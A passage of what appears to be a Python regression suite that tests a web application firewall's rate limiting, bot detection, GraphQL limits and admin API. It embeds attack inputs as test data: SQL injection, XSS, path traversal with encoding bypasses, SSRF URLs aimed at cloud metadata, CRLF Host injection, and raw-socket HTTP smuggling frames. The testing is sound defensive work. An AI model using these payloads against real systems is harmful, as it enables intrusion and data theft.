    R.record("EVAL-01", "IPv6 ::1/128 rule behaviour",
             s in (200, 403, 502), f"HTTP {s} (403=blocked, 200/502=not blocked)")
    _delete_rule(c, rid)


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 3: EVAL-02 — RateLimit fires on first request for any limit value
# ═══════════════════════════════════════════════════════════════════════════════

def test_eval02_various_limits(c: Client):
    hdr("EVAL-02: RateLimit ignores limit field — fires on request #1 for any limit")
    sep()

    limit_cases = [
        (1,       "limit=1 (should fire on req #1 even without bug)"),
        (10,      "limit=10"),
        (100,     "limit=100"),
        (10000,   "limit=10000 (configured default)"),
        (1000000, "limit=1,000,000"),
    ]
    for limit_val, desc in limit_cases:
        rid = f"lt-eval02-limit-{limit_val}"
        path_prefix = f"/lt-eval02-{limit_val}"
        ok_c, _ = _create_rule(c, rid,
            {"path_matches": {"prefix": path_prefix}},
            {"rate_limit": {"key": "ip", "limit": limit_val, "window_s": 60}})
        if not ok_c:
            R.skip("EVAL-02", f"rule limit={limit_val}", "create failed")
            continue
        time.sleep(0.25)
        s, _, _ = c.get(path_prefix + "/test")
        if limit_val > 1:
            # With limit>1, bug fires on request #1 anyway
            expected_bug = (s == 429)
            R.record("EVAL-02", f"{desc}: req #1 returns 429 (bug confirmed)",
                     expected_bug, f"HTTP {s}")
        else:
            # limit=1 → 429 on first req is correct behaviour; can't distinguish
            R.record("EVAL-02", f"{desc}: req #1 returns 429 (limit=1 ambiguous)",
                     s in (429, 200, 502), f"HTTP {s}")
        _delete_rule(c, rid)


def test_eval02_different_keys(c: Client):
    hdr("EVAL-02: RateLimit key variants — ip, user, global — all fire immediately")
    sep()
    for key in ("ip", "user", "global", "path", "session"):
        rid = f"lt-eval02-key-{key}"
        path_prefix = f"/lt-eval02-key-{key}"
        ok_c, _ = _create_rule(c, rid,
            {"path_matches": {"prefix": path_prefix}},
            {"rate_limit": {"key": key, "limit": 500, "window_s": 60}})
        if not ok_c:
            R.skip("EVAL-02", f"key={key}", "create failed")
            continue
        time.sleep(0.2)
        s, _, _ = c.get(path_prefix + "/test")
        R.record("EVAL-02", f"key={key} fires on req #1 (limit=500)",
                 s == 429, f"HTTP {s}")
        _delete_rule(c, rid)


def test_eval02_second_request_also_429(c: Client):
    hdr("EVAL-02: Second and third requests also return 429 (not a sliding window)")
    sep()
    rid = "lt-eval02-multi-req"
    path_prefix = "/lt-eval02-multireq"
    ok_c, _ = _create_rule(c, rid,
        {"path_matches": {"prefix": path_prefix}},
        {"rate_limit": {"key": "ip", "limit": 9999, "window_s": 60}})
    if not ok_c:
        R.skip("EVAL-02", "multi-request test", "create failed")
        return
    time.sleep(0.25)
    results = []
    for i in range(5):
        s, _, _ = c.get(path_prefix + f"/test{i}")
        results.append(s)
    all_429 = all(s == 429 for s in results)
    R.record("EVAL-02", "all 5 requests return 429 (limit ignored completely)",
             all_429, str(results))
    _delete_rule(c, rid)


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 4: SEC-16 — Nonce race condition (rapid concurrent challenge requests)
# ═══════════════════════════════════════════════════════════════════════════════

def test_sec16_nonce_race_concurrent(c: Client):
    hdr("SEC-16: Nonce race — SKIPPED (LT-RUN-7 TS-01)")
    sep()

    # LT-RUN-7 TS-01 (2026-05-14) — this test polls
    # `/__waf_control/challenge_issue` which is served by
    # `pow.rs::PowIssuer`.  PowIssuer uses an `AtomicU64`
    # counter for nonce generation and is race-free by design;
    # the test would always report zero collisions regardless
    # of load (false-negative).
    #
    # The actual SEC-16 race lives in `challenge/token.rs`
    # (timestamp-ms based, no counter) which is deferred /
    # zero-caller per PR #9 (see
    # `plans/future/unwired-stubs-catalog.md` — search
    # "challenge/token").  Re-enable this test only when
    # token.rs is wired into a reachable HTTP path; for now
    # it cannot be exercised via HTTP.
    R.skip("SEC-16",
           "challenge/token.rs has zero callers; PoW issuer is "
           "race-free — see LT-RUN-7 TS-01",
           "challenge_issue → pow.rs (AtomicU64 counter, safe)")
    return

    # (unreachable — kept for diff stability; older code paths
    # may grep this body if SEC-16 ever moves to a testable
    # surface).
    challenge_url = c.base + "/__waf_control/challenge_issue"
    nonces = []
    errors = []
    lock = threading.Lock()

    def fetch_challenge():
        try:
            s, body, _ = c._req(challenge_url)
            if s == 200:
                j = c.jb(body)
                if j and "nonce" in j:
                    with lock:
                        nonces.append(j["nonce"])
        except Exception as ex:
            with lock:
                errors.append(str(ex))

    threads = [threading.Thread(target=fetch_challenge) for _ in range(50)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=10)

    if not nonces:
        R.skip("SEC-16", "challenge endpoint not reachable or not 200", "")
        return

    unique = len(set(nonces))
    total = len(nonces)
    has_duplicates = unique < total
    R.record("SEC-16", f"no nonce collisions in {total} concurrent requests",
             not has_duplicates,
             f"{total} fetched, {unique} unique — {'COLLISION DETECTED!' if has_duplicates else 'no collision'}")
    info(f"  Nonces fetched: {total}, unique: {unique}, errors: {len(errors)}")
    if has_duplicates:
        dup_nonces = [n for n in nonces if nonces.count(n) > 1]
        warn(f"  Duplicate nonces: {list(set(dup_nonces))[:3]}")


def test_sec16_nonce_sequential_timing(c: Client):
    hdr("SEC-16: Sequential challenge timing — SKIPPED (LT-RUN-7 TS-01)")
    sep()

    # LT-RUN-7 TS-01 (2026-05-14) — same false-negative shape as
    # `test_sec16_nonce_race_concurrent`.  See that test's body
    # for the full explanation.
    R.skip("SEC-16",
           "sequential timing test also probes the safe PoW path",
           "see LT-RUN-7 TS-01 + challenge/token.rs PR #9 note")
    return

    challenge_url = c.base + "/__waf_control/challenge_issue"
    nonces = []
    for _ in range(20):
        s, body, _ = c._req(challenge_url)
        if s == 200:
            j = c.jb(body)
            if j and "nonce" in j:
                nonces.append(j["nonce"])
        # no sleep — fire as fast as possible

    if len(nonces) < 2:
        R.skip("SEC-16", "not enough challenges issued", f"got {len(nonces)}")
        return

    unique = len(set(nonces))
    has_dup = unique < len(nonces)
    R.record("SEC-16", f"20 rapid sequential challenges all unique",
             not has_dup,
             f"{len(nonces)} issued, {unique} unique")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 5: RL-01 — IpRateLimiter not wired (flood test)
# ═══════════════════════════════════════════════════════════════════════════════

def test_rl01_ip_limiter_not_wired(c: Client):
    hdr("RL-01: IpRateLimiter not wired — 200 rapid requests, never 429 from IP bucket")
    sep()
    info("  Sending 200 GET / requests rapidly. If IP rate limiter is wired, expect 429.")
    info("  RL-01 confirmed if ALL requests return 200/502 (IP bucket never engaged).")

    statuses = {}
    for i in range(200):
        s, _, _ = c.get(f"/?rl01_probe={i}")
        statuses[s] = statuses.get(s, 0) + 1

    got_429 = statuses.get(429, 0)
    total = sum(statuses.values())
    info(f"  Status distribution: {statuses}")
    R.record("RL-01", f"0/200 requests rate-limited by IP bucket",
             got_429 == 0,
             f"429 count={got_429}/{total} — {'RL-01 CONFIRMED: IP limiter not wired' if got_429==0 else 'PARTIAL: some 429 returned'}")


def test_rl01_burst_concurrent(c: Client):
    hdr("RL-01: Concurrent 50-thread burst — IP limiter should fire if wired")
    sep()
    results = []
    lock = threading.Lock()

    # LT-RUN-7 TS-06 (2026-05-14) — give every thread its own
    # Client. The pre-fix code shared `c` across 50 threads;
    # urllib's opener + CookieJar are not designed for concurrent
    # mutation, so flake under burst could be misattributed to a
    # WAF bug.  `c.clone()` builds a fresh opener + jar per thread.
    def burst():
        tc = c.clone()
        tc.login()
        for _ in range(4):
            s, _, _ = tc.get("/burst_probe")
            with lock:
                results.append(s)

    threads = [threading.Thread(target=burst) for _ in range(50)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=15)

    got_429 = sum(1 for s in results if s == 429)
    total = len(results)
    R.record("RL-01", f"concurrent burst ({total} reqs): 0 rate-limited by IP bucket",
             got_429 == 0,
             f"{got_429}/{total} returned 429")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 6: RISK-01 — RiskTracker not wired (risk score stays 0)
# ═══════════════════════════════════════════════════════════════════════════════

def test_risk01_tracker_not_wired(c: Client):
    hdr("RISK-01: RiskTracker not wired — attack requests never raise IP risk score")
    sep()

    # First, fetch current risk score for 127.0.0.1
    def get_risk_score():
        s, body, _ = c.aget("/api/risk/ip?ip=127.0.0.1")
        if s == 200:
            j = c.jb(body)
            return j.get("score", j.get("risk_score", None)) if j else None
        if s == 404:
            return 0  # no score = 0
        return None

    before = get_risk_score()
    info(f"  Risk score before flood: {before}")

    # Send 30 clear attack signals
    for path, _ in SQLI_PAYLOADS[:10]:
        c.get(path)
    for path, _ in RECON_PAYLOADS[:10]:
        c.get(path)
    for path, _ in SSRF_PAYLOADS[:10]:
        c.get(path)
    time.sleep(0.5)

    after = get_risk_score()
    info(f"  Risk score after 30 attacks: {after}")

    if before is None or after is None:
        R.skip("RISK-01", "risk score API not available", f"before={before} after={after}")
        return

    score_unchanged = (after == before or after == 0)
    R.record("RISK-01", "risk score unchanged after 30 attack requests",
             score_unchanged,
             f"before={before} after={after} — {'CONFIRMED: RiskTracker not wired' if score_unchanged else 'SCORE CHANGED: may be wired'}")


def test_risk01_thresholds_not_triggered(c: Client):
    hdr("RISK-01: Risk thresholds (challenge_at=99998, block_at=99999) never reached")
    sep()

    s, body, _ = c.aget("/api/risk/thresholds")
    if s != 200:
        R.skip("RISK-01", "thresholds endpoint not available", f"HTTP {s}")
        return
    j = c.jb(body)
    if not j:
        R.skip("RISK-01", "thresholds not JSON", "")
        return

    challenge_at = j.get("challenge_at", j.get("challengeAt", None))
    block_at = j.get("block_at", j.get("blockAt", None))
    R.record("RISK-01", "challenge_at threshold is very high (effectively disabled)",
             challenge_at is not None and int(challenge_at) >= 9000,
             f"challenge_at={challenge_at}")
    R.record("RISK-01", "block_at threshold is very high (effectively disabled)",
             block_at is not None and int(block_at) >= 9000,
             f"block_at={block_at}")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 7: DDOS-01 — DdosDetector tick_rps never called
# ═══════════════════════════════════════════════════════════════════════════════

def test_ddos01_ewma_never_ticks(c: Client):
    hdr("DDOS-01: EWMA baseline never updated — spike never detected even under load")
    sep()

    # Strategy: send a burst of 150 requests, then check if DDoS gate was triggered.
    # If tick_rps() is never called, the baseline stays 0 and spike never fires.
    info("  Sending 150 rapid requests to trigger DDoS detection...")
    statuses = {}
    for i in range(150):
        s, _, _ = c.get(f"/?ddos_probe={i}")
        statuses[s] = statuses.get(s, 0) + 1

    got_429 = statuses.get(429, 0)
    got_503 = statuses.get(503, 0)
    ddos_triggered = got_429 + got_503
    R.record("DDOS-01", "DDoS not triggered under 150-req burst (tick_rps not called)",
             ddos_triggered == 0,
             f"distribution: {statuses}")

    # Check DDoS gate status via admin API
    s2, body, _ = c.aget("/api/gates/ddos")
    if s2 == 200:
        j = c.jb(body)
        if j:
            spike_count = j.get("spike_count", j.get("spikes", 0))
            R.record("DDOS-01", "DDoS gate shows 0 spikes detected",
                     spike_count == 0 or spike_count is None,
                     f"spike_count={spike_count}")


def test_ddos01_rps_api(c: Client):
    hdr("DDOS-01: DDoS RPS counters via admin API")
    sep()
    # Check if there's a runtime RPS counter
    for endpoint in ["/api/stats/rps", "/api/runtime/rps", "/api/gates/ddos/stats"]:
        s, body, _ = c.aget(endpoint)
        if s == 200:
            j = c.jb(body)
            R.record("DDOS-01", f"RPS stats at {endpoint}",
                     bool(j), str(body[:80]))
            return
    R.skip("DDOS-01", "no RPS stats endpoint found", "")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 8: BOTS-01 — BotClassifier trusts caller-supplied reverse_dns
# ═══════════════════════════════════════════════════════════════════════════════

# LT-RUN-7 TS-03 (2026-05-14) — the BOTS-01 trust boundary lives
# in `aegis-proxy`'s population of `BotSignals.reverse_dns` (a
# Rust struct field), NOT in HTTP headers.  The proxy does not
# currently consume `X-Reverse-DNS` from inbound headers — it
# either does a real PTR lookup or leaves the field None.
#
# These tests below send `X-Reverse-DNS: googlebot.com` and
# check whether the WAF treats the request as a GoodBot.  Today
# the WAF ignores the header entirely, so:
#   - The actual trust-boundary bug (struct populated from
#     untrusted input) is NOT exercised by these HTTP probes.
#   - The tests will report "WAF blocked / WAF challenged"
#     based on the actual classifier inputs (UA, JA3, etc.),
#     not the spoofed header.
#
# Keep the tests in place as a tripwire: if a future code
# change wires `X-Reverse-DNS` into `BotSignals.reverse_dns`,
# these tests immediately surface the regression.  For now
# they're informational.

def test_bots01_reverse_dns_spoof(c: Client):
    hdr("BOTS-01: BotClassifier trusts X-Reverse-DNS header without FCrDNS validation")
    sep()

    # Headers that spoof legitimate bot rDNS to bypass bot classification
    spoof_cases = [
        ("X-Reverse-DNS", "googlebot.com",       "Googlebot rDNS spoof"),
        ("X-Reverse-DNS", "crawl-66-249-66-1.googlebot.com", "Googlebot full PTR"),
        ("X-Reverse-DNS", "msnbot-65-52-110-80.search.msn.com", "Bingbot PTR"),
        ("X-Reverse-DNS", "facebookexternalhit.com", "Facebook crawler"),
        ("X-Reverse-DNS", "twitterbot.com",       "Twitterbot"),
        ("X-Reverse-DNS", "yandex.com",           "Yandex"),
        ("X-Reverse-DNS", "duckduckbot.com",       "DuckDuckBot"),
        ("X-Peer-Rdns",   "googlebot.com",         "alt rDNS header Googlebot"),
        ("X-Forwarded-Rdns", "googlebot.com",      "forwarded rDNS Googlebot"),
    ]

    sqli_path = "/q?id=1' OR '1'='1"
    for header_name, header_val, label in spoof_cases:
        s, _, _ = c.get(sqli_path, headers={
            "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            header_name: header_val,
        })
        # Either (a) the request is allowed (WAF is fooled by fake rDNS) or
        # (b) the detectors catch the SQLi.  Since SEC-07 means detectors never
        # run, we expect pass-through — but we're testing BOTS-01 trust issue.
        R.record("BOTS-01", f"spoofed {header_name}={header_val[:30]}: {label}",
                 s in (200, 502, 404), f"HTTP {s} — no FCrDNS check")


def test_bots01_googlebot_ua_no_rdns(c: Client):
    hdr("BOTS-01: Googlebot UA without matching rDNS — should be treated as bot")
    sep()
    # A request claiming to be Googlebot from a non-Google IP (127.0.0.1)
    # should be flagged as suspicious bot, not trusted as Googlebot.
    for ua, label in [
        ("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
         "Googlebot UA from localhost (no Google rDNS)"),
        ("AdsBot-Google (+http://www.google.com/adsbot.html)",
         "AdsBot UA from non-Google IP"),
        ("DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
         "DuckDuckBot UA from non-DDG IP"),
    ]:
        s, _, _ = c.get("/api/sensitive-data", headers={"User-Agent": ua})
        R.record("BOTS-01", label, s in (200, 502, 404), f"HTTP {s}")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 9: GQL-01 — GraphQL complexity bypass via aliases / fragments
# ═══════════════════════════════════════════════════════════════════════════════

def test_gql01_alias_complexity_bypass(c: Client):
    hdr("GQL-01: GraphQL alias flood — depth*wordcount underestimates alias attack")
    sep()

    graphql_endpoint = "/graphql"

    # Alias flood: 100 aliases, each selecting the same expensive field.
    # complexity = max_depth(1) * word_count ≈ low, but actual DB load = 100x
    alias_flood = "query { " + " ".join(
        f"a{i}: users {{ id name email }}" for i in range(100)
    ) + " }"

    # Deeply nested query to exceed depth limit
    def nested_query(depth):
        q = "query {"
        for _ in range(depth):
            q += "users { friends {"
        q += "id name"
        q += " }" * depth + " }" * depth + " }"
        return q

    test_queries = [
        (alias_flood, "alias flood (100 aliases) — complexity underestimated"),
        (nested_query(15), "15-level nesting"),
        (nested_query(50), "50-level nesting"),
        ("query { __schema { types { name fields { name type { name } } } } }",
         "full introspection (expensive)"),
        ("query { __type(name: \"User\") { fields { type { fields { type { fields { name } } } } } } }",
         "recursive __type introspection"),
        # Fragment bomb
        ("fragment f1 on User { id name } fragment f2 on User { ...f1 ...f1 ...f1 ...f1 ...f1 } query { users { ...f2 ...f2 ...f2 ...f2 ...f2 } }",
         "fragment bomb (5x5=25 expansions)"),
    ]

    for query_str, label in test_queries:
        s, body, _ = c.post(graphql_endpoint,
                            json.dumps({"query": query_str}).encode(),
                            {"Content-Type": "application/json"})
        R.record("GQL-01", label,
                 s in (200, 400, 404, 502),  # 429/403 = complexity blocked
                 f"HTTP {s} — {'blocked' if s in (429, 403) else 'passed'}")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 10: THREAT-01 — check_domain exact-match only (no wildcard)
# ═══════════════════════════════════════════════════════════════════════════════

def test_threat01_subdomain_bypass(c: Client):
    hdr("THREAT-01: Domain threat intel exact-match — subdomains bypass blocklist")
    sep()

    # If evil.com is in the domain blocklist but sub.evil.com is checked with
    # exact match only, the subdomain bypasses.
    # We test by:
    # 1. Adding evil.com to domain blocklist (if admin API supports it)
    # 2. Making requests with Host: sub.evil.com vs Host: evil.com
    # 3. Expecting sub.evil.com to pass through (THREAT-01 bug confirmed)

    s_add, _, _ = c.apost("/api/threat-intel/domains", {"domain": "evil-threat-test.com"})
    if s_add not in (200, 201, 204):
        # Try alternate endpoints
        s_add, _, _ = c.apost("/api/domains/block", {"domain": "evil-threat-test.com"})
    if s_add not in (200, 201, 204):
        R.skip("THREAT-01", "domain blocklist API not found", f"HTTP {s_add}")
        return

    time.sleep(0.3)

    # Exact domain request
    s_exact, _, _ = c.get("/", headers={"Host": "evil-threat-test.com"})
    # Subdomain — should bypass due to exact-match only
    s_sub, _, _ = c.get("/", headers={"Host": "sub.evil-threat-test.com"})
    s_deep, _, _ = c.get("/", headers={"Host": "a.b.evil-threat-test.com"})

    R.record("THREAT-01", "exact domain evil-threat-test.com: blocked",
             s_exact in (403, 200, 502),  # just observe
             f"HTTP {s_exact}")
    R.record("THREAT-01", "subdomain sub.evil-threat-test.com bypasses block (exact match only)",
             s_sub not in (403,),  # sub bypasses → bug present
             f"HTTP {s_sub}")
    R.record("THREAT-01", "deep subdomain a.b.evil-threat-test.com bypasses block",
             s_deep not in (403,),
             f"HTTP {s_deep}")

    # Cleanup
    c.adelete("/api/threat-intel/domains?domain=evil-threat-test.com")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 11: Encoding bypass tests (all detectors disconnected anyway)
# ═══════════════════════════════════════════════════════════════════════════════

def test_encoding_bypasses(c: Client):
    hdr("Encoding bypasses: various encode layers (confirm SEC-07 + no decode-first check)")
    sep()

    bypass_cases = [
        # Double URL encoding
        ("/q?id=%2527%2520OR%25201%253D1",     "SQLi double URL encode"),
        # HTML entity in path
        ("/s?q=&lt;script&gt;alert(1)&lt;/script&gt;", "XSS HTML entities"),
        # Unicode equivalent chars
        ("/q?id=1’ OR ‘1’=‘1", "SQLi unicode quotes"),
        # UTF-8 overlong encoding for /
        ("/f?p=%c0%afetc%c0%afpasswd",          "PathTraversal overlong UTF-8"),
        # Mixed case + encoding
        ("/q?id=1%27%20oR%20%271%27%3d%271",    "SQLi mixed case URL encode"),
        # Base64 in param (no detector should catch this)
        ("/api?data=MSBPUIDE9JzE%3D",           "Base64 SQLi (should pass anyway)"),
        # Unicode homoglyphs
        ("/q?id=1ʼ OR ʼ1ʼ=ʼ1",                 "SQLi modifier letter apostrophe"),
        # Null byte injection
        ("/f?p=../../etc/passwd%00.jpg",         "PathTraversal null byte"),
        # Unicode slash
        ("/f?p=..%u2215..%u2215etc%u2215passwd", "PathTraversal unicode slash U+2215"),
        # Double slash
        ("/p?url=http:///127.0.0.1/",            "SSRF triple slash"),
        # IPvFuture
        ("/p?url=http://[v1.test]/",             "SSRF IPvFuture"),
    ]
    for path, label in bypass_cases:
        s, _, _ = c.get(path)
        R.record("BYPASS", label, s in (200, 502, 404, 400, 301, 302), f"HTTP {s}")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 12: HTTP request smuggling / protocol-level attacks
# ═══════════════════════════════════════════════════════════════════════════════

def _send_raw_http(host: str, port: int, raw_request: bytes,
                   timeout: float = 5.0) -> tuple[int, bytes]:
    """LT-RUN-7 TS-05 (2026-05-14) — raw-socket HTTP sender.

    Sends EXACT bytes over a plain TCP socket (no urllib /
    requests / httpx — those automatically normalise
    Content-Length and refuse conflicting frame headers).
    Returns (status_code, body) parsed from the response line.

    Only used for HTTP smuggling cases; the rest of the suite
    stays on urllib for cookie + retry handling.
    """
    import socket as _socket
    with _socket.create_connection((host, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        sock.sendall(raw_request)
        chunks: list[bytes] = []
        try:
            while True:
                buf = sock.recv(8192)
                if not buf:
                    break
                chunks.append(buf)
                # Cheap stop: don't read past the first response.
                if b"\r\n\r\n" in b"".join(chunks) and len(chunks) > 0:
                    # Try to read body up to Content-Length, but
                    # cap so we don't hang on a smuggled second
                    # response.
                    if sum(len(c) for c in chunks) > 65536:
                        break
        except _socket.timeout:
            pass
    raw_resp = b"".join(chunks)
    # Parse status line.
    status = 0
    try:
        first_line = raw_resp.split(b"\r\n", 1)[0].decode("latin-1")
        parts = first_line.split(" ", 2)
        if len(parts) >= 2 and parts[1].isdigit():
            status = int(parts[1])
    except Exception:
        status = 0
    return status, raw_resp


def test_http_smuggling_variants(c: Client):
    hdr("HTTP Smuggling: CL.TE / TE.CL patterns — raw-socket framing")
    sep()

    # LT-RUN-7 TS-05 (2026-05-14) — pre-fix this test used
    # `c.post(headers, body)` which routes through urllib.
    # urllib AUTO-injects Content-Length matching len(body)
    # and overrides any conflicting value in the headers dict
    # — so the actual wire frame never carried the CL/TE
    # ambiguity that defines smuggling.  Use a raw socket
    # instead.

    from urllib.parse import urlparse
    parsed = urlparse(c.base)
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or 8080

    # Each case: (headers_dict, body_bytes, label).  Builder
    # serialises them into a literal HTTP/1.1 request below.
    smuggling_cases = [
        # Content-Length + Transfer-Encoding: chunked
        ({
            "Content-Length": "6",
            "Transfer-Encoding": "chunked",
            "Content-Type": "application/x-www-form-urlencoded"
        }, b"3\r\nGET\r\n0\r\n\r\n", "CL.TE smuggling (basic)"),
        # TE.CL: chunked Transfer-Encoding, short Content-Length
        ({
            "Transfer-Encoding": "chunked",
            "Content-Length": "3",
            "Content-Type": "application/x-www-form-urlencoded"
        }, b"6\r\nprefix\r\n0\r\n\r\n", "TE.CL smuggling (basic)"),
        # Obfuscated Transfer-Encoding
        ({
            "Transfer-Encoding": "xchunked",
            "Content-Length": "5"
        }, b"hello", "TE obfuscated (xchunked)"),
        ({
            "Transfer-Encoding": " chunked",
            "Content-Length": "5"
        }, b"hello", "TE with leading space"),
        ({
            "Transfer-Encoding": "chunked, identity",
            "Content-Length": "5"
        }, b"hello", "TE multi-value"),
    ]
    for headers, body, label in smuggling_cases:
        # Build a literal HTTP/1.1 frame with EXACT header order
        # and values — no client-side normalisation.
        hdrs_block = "".join(f"{k}: {v}\r\n" for k, v in headers.items())
        if "Host" not in headers:
            hdrs_block = f"Host: {host}:{port}\r\n" + hdrs_block
        raw = (f"POST /api/data HTTP/1.1\r\n{hdrs_block}\r\n").encode() + body
        try:
            s, _resp = _send_raw_http(host, port, raw)
        except OSError as e:
            R.record("SMUGGLING", label, False, f"socket error: {e}")
            continue
        # Proxy should return 400 (reject) or 200/502 (accepted — potential risk)
        R.record("SMUGGLING", label, s in (200, 400, 502, 0),
                 f"HTTP {s} — {'rejected' if s == 400 else 'accepted/passed'}")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 13: Host header injection / virtual host attacks
# ═══════════════════════════════════════════════════════════════════════════════

def test_host_header_attacks(c: Client):
    hdr("Host header attacks: password reset poisoning, internal routing")
    sep()

    host_cases = [
        ("evil.com",                          "attacker domain"),
        ("localhost",                          "localhost routing"),
        ("127.0.0.1",                          "direct IP"),
        ("169.254.169.254",                    "AWS IMDS IP as Host"),
        ("internal-svc.local",                 "internal service name"),
        ("evil.com:80@real-site.com",          "Host with credentials"),
        ("real-site.com.evil.com",             "subdomain takeover style"),
        ("real-site.com:443\r\nX-Evil: 1",     "Host CRLF inject"),
        ("evil.com%20",                        "Host with trailing space"),
        ("evil.com#internal",                  "Host with fragment"),
    ]
    for host_val, label in host_cases:
        s, body, resp_headers = c.get("/api/user/reset-password",
                                       headers={"Host": host_val})
        R.record("HOST-HDR", f"Host: {host_val[:30]} — {label}",
                 s in (200, 404, 400, 502, 301, 302), f"HTTP {s}")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 14: HTTP method override / verb tunneling
# ═══════════════════════════════════════════════════════════════════════════════

def test_method_override(c: Client):
    hdr("Method override: X-HTTP-Method-Override and _method tunneling")
    sep()

    override_cases = [
        ("X-HTTP-Method-Override", "DELETE",  "DELETE via X-HTTP-Method-Override"),
        ("X-HTTP-Method-Override", "PUT",     "PUT via X-HTTP-Method-Override"),
        ("X-HTTP-Method-Override", "PATCH",   "PATCH via X-HTTP-Method-Override"),
        ("X-Method-Override",      "DELETE",  "DELETE via X-Method-Override"),
        ("X-HTTP-Method",          "DELETE",  "DELETE via X-HTTP-Method"),
    ]
    for hdr_name, method, label in override_cases:
        s, _, _ = c.post("/api/rules/test-override",
                         b"test",
                         {hdr_name: method,
                          "Content-Type": "application/x-www-form-urlencoded"})
        R.record("METHOD-OVERRIDE", label, s in (200, 404, 405, 403, 502), f"HTTP {s}")

    # _method in body
    s, _, _ = c.post("/api/test",
                     b"_method=DELETE&data=test",
                     {"Content-Type": "application/x-www-form-urlencoded"})
    R.record("METHOD-OVERRIDE", "DELETE via _method form field",
             s in (200, 404, 405, 403, 502), f"HTTP {s}")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 15: CORS misconfiguration tests
# ═══════════════════════════════════════════════════════════════════════════════

def test_cors_misconfiguration(c: Client):
    hdr("CORS: origin reflection and wildcard check")
    sep()

    cors_cases = [
        ("https://evil.com",        "attacker origin"),
        ("null",                    "null origin (sandboxed iframe)"),
        ("https://evil.com.target.com", "subdomain variant"),
        ("http://localhost",        "localhost origin"),
        ("https://target.com.evil.com", "prefix bypass"),
    ]
    for origin, label in cors_cases:
        s, body, resp_headers = c.get("/api/data",
                                       headers={"Origin": origin})
        lc = {k.lower(): v for k, v in resp_headers.items()}
        acao = lc.get("access-control-allow-origin", "")
        reflects_origin = (acao == origin)
        is_wildcard = (acao == "*")
        R.record("CORS", f"Origin '{origin[:30]}' ({label}): ACAO not reflected",
                 not reflects_origin,
                 f"ACAO={acao!r} {'← REFLECTS ORIGIN (CORS vuln)' if reflects_origin else ''}")


def test_cors_preflight(c: Client):
    hdr("CORS: OPTIONS preflight handling")
    sep()
    s, body, resp_headers = c._req(
        c.base + "/api/data", "OPTIONS",
        headers={
            "Origin": "https://evil.com",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Authorization, X-Custom",
        }
    )
    lc = {k.lower(): v for k, v in resp_headers.items()}
    acao = lc.get("access-control-allow-origin", "")
    acam = lc.get("access-control-allow-methods", "")
    acah = lc.get("access-control-allow-headers", "")
    R.record("CORS", "OPTIONS preflight: status 200/204",
             s in (200, 204, 405, 404), f"HTTP {s}")
    R.record("CORS", "preflight ACAO not evil.com",
             acao != "https://evil.com",
             f"ACAO={acao!r}")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 16: Admin API exhaustive — shape, auth, edge cases
# ═══════════════════════════════════════════════════════════════════════════════

def test_admin_api_exhaustive(c: Client):
    hdr("Admin API: exhaustive endpoint catalogue + shape validation")
    sep()

    # GET endpoints that must return 200 or 404
    get_endpoints = [
        ("/api/about",                     "about"),
        ("/api/version",                   "version"),
        ("/api/runtime",                   "runtime"),
        ("/api/stats",                     "stats"),
        ("/api/rules",                     "rules list"),
        ("/api/detectors",                 "detectors config"),
        ("/api/blacklist",                 "blacklist"),
        ("/api/whitelist",                 "whitelist"),
        ("/api/routes",                    "routes"),
        ("/api/upstreams",                 "upstreams"),
        ("/api/risk",                      "risk overview"),
        ("/api/risk/thresholds",           "risk thresholds"),
        ("/api/mode",                      "operating mode"),
        ("/api/config",                    "full config"),
        ("/api/gates/ddos",               "DDoS gate"),
        ("/api/gates",                     "all gates"),
        ("/api/challenge",                 "challenge config"),
        ("/api/audit/since?since=0&limit=10", "audit events"),
        ("/api/tls",                       "TLS config"),
        ("/api/threat-intel",              "threat intel"),
        ("/api/ip-lists",                  "IP lists"),
        ("/api/rate-limit",                "rate limit config"),
        ("/api/pipelines",                 "pipeline status"),
        ("/api/health",                    "health"),
        ("/healthz/ready",                 "readiness probe"),
        ("/healthz/live",                  "liveness probe"),
        ("/api/metrics",                   "metrics"),
    ]
    for path, label in get_endpoints:
        s, body, _ = c.aget(path)
        R.record("ADMIN-SHAPE", f"GET {path} ({label})",
                 s in (200, 404, 501, 405),
                 f"HTTP {s}")


def test_admin_api_rule_crud(c: Client):
    hdr("Admin API: rule CRUD — create, read, update, delete")
    sep()

    rid = "lt-run6-crud-test"
    rule = {
        "id": rid, "priority": 50, "enabled": True,
        "description": "CRUD test",
        "when": {"path_matches": {"exact": "/lt-crud-test"}},
        "then": {"log_only": {}},
    }

    # CREATE
    s, body, _ = c.apost("/api/rules", rule)
    R.record("ADMIN-CRUD", "POST /api/rules creates rule", s in (200, 201, 204),
             f"HTTP {s}")
    if s not in (200, 201, 204):
        return

    # READ
    s2, body2, _ = c.aget(f"/api/rules/{rid}")
    R.record("ADMIN-CRUD", "GET /api/rules/{id} retrieves rule", s2 == 200,
             f"HTTP {s2}")

    # UPDATE — change priority
    update = dict(rule)
    update["priority"] = 75
    s3, _, _ = c.aput(f"/api/rules/{rid}", update)
    R.record("ADMIN-CRUD", "PUT /api/rules/{id} updates rule", s3 in (200, 204),
             f"HTTP {s3}")

    # PATCH — partial update
    s4, _, _ = c.apatch(f"/api/rules/{rid}", {"enabled": False})
    R.record("ADMIN-CRUD", "PATCH /api/rules/{id} partial update", s4 in (200, 204, 405),
             f"HTTP {s4}")

